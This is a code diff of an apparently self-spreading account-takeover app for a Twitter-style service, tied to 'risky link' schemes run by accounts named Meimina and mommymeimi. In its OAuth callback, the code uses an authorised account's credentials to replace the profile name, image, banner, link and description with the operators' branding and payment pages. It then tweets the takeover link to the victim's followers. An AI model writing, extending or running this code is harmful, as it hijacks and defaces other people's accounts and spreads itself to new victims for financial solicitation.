@@ -90,9 +90,9 @@ def test():
     print(starturi)
     return redirect(starturi)
     
-def update_profile_banner(client):
+def update_profile_banner(client,img_name):
     print("inside update_profile_banner")
-    with open("banner.png", "rb") as image_file:
+    with open(img_name, "rb") as image_file:
         encoded_string = base64.b64encode(image_file.read())
         params=urllib.parse.urlencode({"banner":encoded_string.decode("utf-8")})
         resp,content=client.request(update_profile_banner_url,"POST",body=params)
@@ -103,9 +103,9 @@ def update_profile_banner(client):
         #print(content)
         return
 
-def update_profile_image(client):
+def update_profile_image(client,img_name):
     print("inside update_profile_image")
-    with open("Meiminass.png", "rb") as image_file:
+    with open(img_name, "rb") as image_file:
         encoded_string = base64.b64encode(image_file.read())
         params=urllib.parse.urlencode({"image":encoded_string.decode("utf-8")})
         resp,content=client.request(update_profile_image_url,"POST",body=params)
@@ -256,8 +256,8 @@ def callback():
             
             description="I clicked a risky link for @PrincessMeimina. You should $END $ERVE $UBMIT to Meimina$$ too."
             update_profile(real_client,"beacons.ai/princessmeimina","beneath Meimina$$",description)
-            update_profile_image(real_client)
-            update_profile_banner(real_client)
+            update_profile_image(real_client,'Meiminass.png')
+            update_profile_banner(real_client,'banner.png')
             name = "Meiminaddict #"+str(random.random())[2:8]
             update_profile_name(real_client,name)
             print('gonna tweet')
@@ -320,7 +320,9 @@ def callback():
             description="checkout https://tinyurl.com/mommymeimiriskylink for account takeover by @mommymeimi."
 
             update_profile(real_client,"youpay.me/mommymeimi","mommymeimi's leash",description)
-           
+            update_profile_image(real_client,'mommymeimipfp.png')
+            update_profile_banner(real_client,'mommymeimibanner.jpg')
+            
             tweetcontent='I clicked a risky link from @mommymeimi and mommy hacked my account. I am dumb for @mommymeimi. You should get dumb for mommy too: https://tinyurl.com/mommymeimiriskylink'
         
             name = "MommyMeimi's Drone #"+str(random.random())[2:6]
